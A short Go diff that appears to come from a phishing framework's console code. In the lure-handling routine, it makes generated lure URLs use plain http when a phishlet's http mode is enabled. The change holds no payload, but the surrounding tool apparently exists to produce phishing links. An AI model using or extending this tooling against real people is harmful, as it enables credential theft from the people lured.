@@ -784,7 +784,12 @@ func (t *Terminal) handleLures(args []string) error {
 
 				var base_url string
 				if l.Hostname != "" {
-					base_url = "https://" + l.Hostname + l.Path
+					// Use correct scheme based on http_mode setting
+					scheme := "https"
+					if t.cfg.IsPhishletHttpModeEnabled(l.Phishlet) {
+						scheme = "http"
+					}
+					base_url = scheme + "://" + l.Hostname + l.Path
 				} else {
 					purl, err := pl.GetLureUrl(l.Path)
 					if err != nil {
